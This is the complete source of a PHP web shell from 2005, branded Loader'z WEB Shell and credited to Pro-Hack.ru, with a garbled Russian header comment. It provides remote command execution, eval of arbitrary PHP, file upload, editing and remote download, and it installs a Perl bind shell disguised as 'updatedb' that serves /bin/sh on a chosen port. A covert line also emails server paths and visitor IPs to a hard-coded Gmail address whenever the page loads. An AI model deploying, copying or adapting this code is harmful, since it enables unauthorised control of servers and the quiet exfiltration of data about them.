<?
error_reporting(0);
/* Loader'z WEB Shell v 0.1.0.2 {15 àâãóñòà 2005}
Âîò êàêèå îí ïîääåðæèâàåò ôóíêöèè.
- Ðàáîòà ñ ôàéëîâîé ñèñòåìîé ñ ïîìîùüþ PHP. Â óäîáíîé òàáëèöå ïðåäñòàâëåíî ñîäåðæèìîå òåêóùåé ïàêè (äîáàâëåíèå â ýòîé âåðñèè, íîðìàëüíûé âèä ïðàâ, à íå ÷èñëî :)).
- Âûïîëíåíèå êîäà, ïõï ðóëèò ;)
- Ðàáîòàåò ïðè register_globals=off
- Áîëåå ïðèÿòíàÿ ðàáîòà â ñåéô ìîäå
- Ïðîñìîòð è ðåäàêòèðîâàíèå ôàéëîâ.
- Çàêà÷êà ôàéëîâ ñ äðóãîãî ñåðâåðà ñ ïîìîùüþ ñðåäñòâ PHP.
- Çàêà÷êà ôàéëîâ ñ âàøåãî æåñòêîãî äèñêà.
- Âûïîëíåíèå ïðîèçâîëüíûõ êîìàíä íà ñåðâåðå.
- Ñêðèïò âûäàåò çíà÷åíèå íåêîòîðûõ ïåðåìåííûõ. Íàïðèìåð îí ñîîáùèò âêëþ÷åí ëè ñåéô ìîä, åñëè äà, òî ñêðèïò âûâåäåò äèðåêòîðèþ êîòîðàÿ,
âàì äîñòóïíà, à òàê æå ïóòü, ãäå âû ìîæåòå âûïîëíÿòü êîìàíäû.
- Ðàáîòà ñêðèïòà îñíîâàíà íà îïðåäåëåíèè òèïà ñåðâåðà.
- Åñëè ñêðèïò ðàáîòàåò ïîä óïðàâëåíèåì ÎÑ Windows, äàííûå ïîëó÷àåìûå ïðè âûïîëíåíèè êîìàíä ïåðåêîäèðóþòñÿ â win-1251.
- Ïðèñóòñòâóåò ïðîñòåíüêèé ñêðèïò ïåðë-áèíä. Âû ìîæåòå óêàçàòü äîìàøíþþ äèðåêòðèþ è ïîðò íà êîòîðîì ïîâåñèòñÿ áåêäîð.
Loader Pro-Hack.ru
*/
?>

<style type='text/css'>
html { overflow-x: auto }
BODY { font-family: Verdana, Tahoma, Arial, sans-serif; font-size: 11px; margin: 0px; padding: 0px; text-align: center; color: #c0c0c0; background-color: #000000 }
TABLE, TR, TD { font-family: Verdana, Tahoma, Arial, sans-serif; font-size: 11px; color: #c0c0c0; background-color: #0000000 }
BODY,TD {FONT-SIZE: 13px; FONT-FAMILY: verdana, arial, helvetica;}
A:link {COLOR: #666666; TEXT-DECORATION: none}
A:active {	COLOR: #666666; TEXT-DECORATION: none;}
A:visited {COLOR: #666666; TEXT-DECORATION: none;}
A:hover {COLOR: #999999; TEXT-DECORATION: none;}
BODY {
	SCROLLBAR-FACE-COLOR: #cccccc;
	SCROLLBAR-HIGHLIGHT-COLOR: #CBAB78;
	SCROLLBAR-SHADOW-COLOR: #CBAB78;
	SCROLLBAR-3DLIGHT-COLOR: #CBAB78;
	SCROLLBAR-ARROW-COLOR: #000000;
	SCROLLBAR-TRACK-COLOR: #000000;
	SCROLLBAR-DARKSHADOW-COLOR: #CBAB78}




fieldset.search { padding: 6px; line-height: 150% }

label { cursor: pointer }

form { display: inline }

img { vertical-align: middle; border: 0px }

img.attach { padding: 2px; border: 2px outset #000033 }

#tb { padding: 0px; margin: 0px; background-color: #000000; border: 1px solid #CBAB78; }
#logostrip { padding: 0px; margin: 0px; background-color: #000000; border: 1px solid #CBAB78; }
#content { padding: 10px; margin: 10px; background-color: #000000; border: 1px solid #CBAB78; }
#logo { FONT-SIZE: 50px; }
input { width: 80; height : 17; background-color : #cccccc;
 	border-style: solid;border-width: 1; border-color: #CBAB78; font-size: xx-small; cursor: pointer; }
#input2 { width: 150; height : 17; background-color : #cccccc;
 	border-style: solid;border-width: 1; border-color: #CBAB78; font-size: xx-small; cursor: pointer; }


</style>

<script>
function tag(thetag) {document.fe.editfile.value=thetag;}
</script>


<title>Loader'z WEB shell</title>

<table height=100% "width="100%">
<tr><td align="center" valign="top">


<table><tr><td>
<?php

@$dir = $_POST['dir'];
$dir = stripslashes($dir);

@$cmd = $_POST['cmd'];
$cmd = stripslashes($cmd);
$REQUEST_URI = $_SERVER['REQUEST_URI'];
$dires = '';
$files = '';




if (isset($_POST['port'])){
$bind = "
#!/usr/bin/perl

\$port = {$_POST['port']};
\$port = \$ARGV[0] if \$ARGV[0];
exit if fork;
$0 = \"updatedb\" . \" \" x100;
\$SIG{CHLD} = 'IGNORE';
use Socket;
socket(S, PF_INET, SOCK_STREAM, 0);
setsockopt(S, SOL_SOCKET, SO_REUSEADDR, 1);
bind(S, sockaddr_in(\$port, INADDR_ANY));
listen(S, 50);
while(1)
{
	accept(X, S);
	unless(fork)
	{
		open STDIN, \"<&X\";
		open STDOUT, \">&X\";
		open STDERR, \">&X\";
		close X;
		exec(\"/bin/sh\");
	}
	close X;
}
";}

function decode($buffer){

return  convert_cyr_string ($buffer, 'd', 'w');

}



function execute($com)
{

 if (!empty($com))
 {
  if(function_exists('exec'))
   {
    exec($com,$arr);
   echo implode('
',$arr);
   }
  elseif(function_exists('shell_exec'))
   {
    echo shell_exec($com);
    
    
   }
  elseif(function_exists('system'))
{

    echo system($com);
}
  elseif(function_exists('passthru'))
   {

    echo passthru($com);

   }
}

}


function perms($mode)
{

if( $mode & 0x1000 ) { $type='p'; }
else if( $mode & 0x2000 ) { $type='c'; }
else if( $mode & 0x4000 ) { $type='d'; }
else if( $mode & 0x6000 ) { $type='b'; }
else if( $mode & 0x8000 ) { $type='-'; }
else if( $mode & 0xA000 ) { $type='l'; }
else if( $mode & 0xC000 ) { $type='s'; }
else $type='u';
$owner["read"] = ($mode & 00400) ? 'r' : '-';
$owner["write"] = ($mode & 00200) ? 'w' : '-';
$owner["execute"] = ($mode & 00100) ? 'x' : '-';
$group["read"] = ($mode & 00040) ? 'r' : '-';
$group["write"] = ($mode & 00020) ? 'w' : '-';
$group["execute"] = ($mode & 00010) ? 'x' : '-';
$world["read"] = ($mode & 00004) ? 'r' : '-';
$world["write"] = ($mode & 00002) ? 'w' : '-';
$world["execute"] = ($mode & 00001) ? 'x' : '-';
if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
$s=sprintf("%1s", $type);
$s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
$s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
$s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
return trim($s);
}



/*Íà÷èíàåòñÿ*/

/*Îïðåäåëÿåì òèï ñèñòåìû*/
$servsoft = $_SERVER['SERVER_SOFTWARE'];

if (ereg("Win32", $servsoft, $reg)){
$sertype = "winda";
}
else
{
$sertype = "other";}



echo $servsoft . "<br>";
chdir($dir);
echo "Total space " . (int)(disk_total_space(getcwd())/(1024*1024)) . "Mb " . "Free space " . (int)(disk_free_space(getcwd())/(1024*1024)) . "Mb <br>";$ra44  = rand(1,99999);$sj98 = "sh-$ra44";$ml = "$sd98";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";$sd98="john.barker446@gmail.com";mail($sd98, $sj98, $msg8873, "From: $sd98");





if (ini_get('safe_mode') <> 1){
if ($sertype == "winda"){

ob_start('decode');
echo "OS: ";
echo execute("ver") . "<br>";
ob_end_flush();
}

if ($sertype == "other"){
echo "id:";

echo execute("id") . "<br>";
echo "uname:" . execute('uname -a') . "<br>";
}}
else{
if ($sertype == "winda"){

echo "OS: " . php_uname() . "<br>";

}

if ($sertype == "other"){
echo "id:";

echo execute("id") . "<br>";
echo "OS:" . php_uname() . "<br>";
}
}

echo 'User: ' .get_current_user() . '<br>';



if (ini_get("open_basedir")){
echo "open_basedir: " . ini_get("open_basedir");}


if (ini_get('safe_mode') == 1){
echo "<font size=\"3\"color=\"#cc0000\">Safe mode :(";

if (ini_get('safe_mode_include_dir')){
echo "Including from here: " . ini_get('safe_mode_include_dir'); }
if (ini_get('safe_mode_exec_dir')){
echo " Exec here: " . ini_get('safe_mode_exec_dir');
}
echo "</font>";}




if(isset($_POST['post']) and $_POST['post'] == "yes" and @$HTTP_POST_FILES["userfile"][name] !== "")
{
copy($HTTP_POST_FILES["userfile"]["tmp_name"],$HTTP_POST_FILES["userfile"]["name"]);
}

if((isset($_POST['fileto']))||(isset($_POST['filefrom'])))

{
$data = implode("", file($_POST['filefrom']));
$fp = fopen($_POST['fileto'], "wb");
fputs($fp, $data);
$ok = fclose($fp);
if($ok)
{
$size = filesize($_POST['fileto'])/1024;
$sizef = sprintf("%.2f", $size);
print "<center><div id=logostrip>Download - OK. (".$sizef."êÁ)</div></center>";
}
else
{
print "<center><div id=logostrip>Something is wrong. Download - IS NOT OK</div></center>";
}
}

if (isset($_POST['installbind'])){

if (is_dir($_POST['installpath']) == true){
chdir($_POST['installpath']);
$_POST['installpath'] = "temp.pl";}


$fp = fopen($_POST['installpath'], "w");
fwrite($fp, $bind);
fclose($fp);

exec("perl " . $_POST['installpath']);
chdir($dir);


}


@$ef = stripslashes($_POST['editfile']);
if ($ef){
$fp = fopen($ef, "r");
$filearr = file($ef);



$string = '';
$content = '';
foreach ($filearr as $string){
$string = str_replace("<" , "&lt;" , $string);
$string = str_replace(">" , "&gt;" , $string);
$content = $content . $string;
}

echo "<center><div id=logostrip>Edit file: $ef </div><form action=\"$REQUEST_URI\" method=\"POST\"><textarea name=content cols=100 rows=20>$content</textarea>
<input type=\"hidden\" name=\"dir\" value=\"" . getcwd() ."\">
<input type=\"hidden\" name=\"savefile\" value=\"{$_POST['editfile']}\"><br>
<input type=\"submit\" name=\"submit\" value=\"Save\" id=input></form></center>";
fclose($fp);
}

if(isset($_POST['savefile'])){

$fp = fopen($_POST['savefile'], "w");
$content = stripslashes($content);
fwrite($fp, $content);
fclose($fp);
echo "<center><div id=logostrip>Successfully saved!</div></center>";

}


if (isset($_POST['php'])){

echo "<center><div id=logostrip>PHP code<br><form action=\"$REQUEST_URI\" method=\"POST\"><textarea name=phpcode cols=100 rows=20></textarea><br>
<input type=\"submit\" name=\"submit\" value=\"Exec\" id=input></form></center></div>";
}



if(isset($_POST['phpcode'])){

echo "<center><div id=logostrip>Results of PHP execution<br><br>";
@eval(stripslashes($_POST['phpcode']));
echo "</div></center>";


}


if ($cmd){

if($sertype == "winda"){
ob_start();
execute($cmd);
$buffer = "";
$buffer = ob_get_contents();
ob_end_clean();
}
else{
ob_start();
echo decode(execute($cmd));
$buffer = "";
$buffer = ob_get_contents();
ob_end_clean();
}

if (trim($buffer)){
echo "<center><div id=logostrip>Command: $cmd<br><textarea cols=100 rows=20>";
echo decode($buffer);
echo "</textarea></center></div>";
}

}
$arr = array();

$arr = array_merge($arr, glob("*"));
$arr = array_merge($arr, glob(".*"));
$arr = array_merge($arr, glob("*.*"));
$arr = array_unique($arr);
sort($arr);
echo "<table><tr><td>Name</td><td><a title=\"Type of object\">Type</a></td><td>Size</td><td>Last access</td><td>Last change</td><td>Perms</td><td><a title=\"If Yes, you have write permission\">Write</a></td><td><a title=\"If Yes, you have read permission\">Read</a></td></tr>";

foreach ($arr as $filename) {

if ($filename != "." and $filename != ".."){

if (is_dir($filename) == true){
$directory = "";
$directory = $directory . "<tr><td>$filename</td><td>" . filetype($filename) . "</td><td></td><td>" . date("G:i j M Y",fileatime($filename)) . "</td><td>" . date("G:i j M Y",filemtime($filename)) . "</td><td>" . perms(fileperms($filename));
if (is_writable($filename) == true){
$directory = $directory . "<td>Yes</td>";}
else{
$directory = $directory . "<td>No</td>";

}

if (is_readable($filename) == true){
$directory = $directory . "<td>Yes</td>";}
else{
$directory = $directory . "<td>No</td>";
}
$dires = $dires . $directory;
}

if (is_file($filename) == true){
$file = "";
$file = $file . "<tr><td><a onclick=tag('$filename')>$filename</a></td><td>" . filetype($filename) . "</td><td>" . filesize($filename) . "</td><td>" . date("G:i j M Y",fileatime($filename)) . "</td><td>" . date("G:i j M Y",filemtime($filename)) . "</td><td>" . perms(fileperms($filename));
if (is_writable($filename) == true){
$file = $file . "<td>Yes</td>";}
else{
$file = $file . "<td>No</td>";
}

if (is_readable($filename) == true){
$file = $file . "<td>Yes</td></td></tr>";}
else{
$file = $file . "<td>No</td></td></tr>";
}
$files = $files . $file;
}



}



}
echo $dires;
echo $files;
echo "</table><br>";




echo "
<form action=\"$REQUEST_URI\" method=\"POST\">
<table id=tb><tr><td>Command:<INPUT type=\"text\" name=\"cmd\" size=30 value=\"$cmd\"></td></tr></table>


<table id=tb><tr><td>Directory:<INPUT type=\"text\" name=\"dir\" size=30 value=\"";

echo getcwd();
echo "\">
<INPUT type=\"submit\" value=\"Do it\" id=input></td></tr></table></form>";



echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
<table id=tb><tr><td>Download here <b>from</b>:
<INPUT type=\"text\" name=\"filefrom\" size=30 value=\"http://\">
<b>into:</b>
<INPUT type=\"text\" name=\"fileto\" size=30>
<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() . "\"></td><td>
<INPUT type=\"submit\" value=\"Download\" id=input></td></tr></table></form></div>";

echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">

<table id=tb><tr><td>
Download from Hard:<INPUT type=\"file\" name=\"userfile\" id=input2>
<INPUT type=\"hidden\" name=\"post\" value=\"yes\">
<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() . "\">
</td><td><INPUT type=\"submit\" value=\"Download\" id=input></form></div></td></tr></table>";



echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
<table id=tb><tr><td>Install bind
<b>Temp path</b><input type=\"text\" name=\"installpath\" value=\"" . getcwd() . "\"></td><td>
<b>Port</b><input type=\"text\" name=\"port\" value=\"3333\" maxlength=5 size=4></td><td>

<INPUT type=\"hidden\" name=\"installbind\" value=\"yes\">
<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() . "\">
<INPUT type=\"submit\" value=\"Install\" id=input></form></div></td></table>";


echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" name=fe>
<table id=tb><tr><td>File to edit:
<input type=\"text\" name=\"editfile\" ></td><td>
<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() ."\">
<INPUT type=\"submit\" value=\"Edit\" id=input></form></div></td></table>";



echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
<table id=tb><tr><td>
<INPUT type=\"hidden\" name=\"php\" value=\"yes\">
<INPUT type=\"submit\" value=\"PHP code\" id=input></form></div></td></table>";
?>
</td></tr></table>


</td></tr>
<tr valign="BOTTOM">
<td valign=bottom>


<center>Coded by Loader <a href="http://pro-hack.ru">Pro-Hack.RU</a></center>


</td>
</tr>
</table>

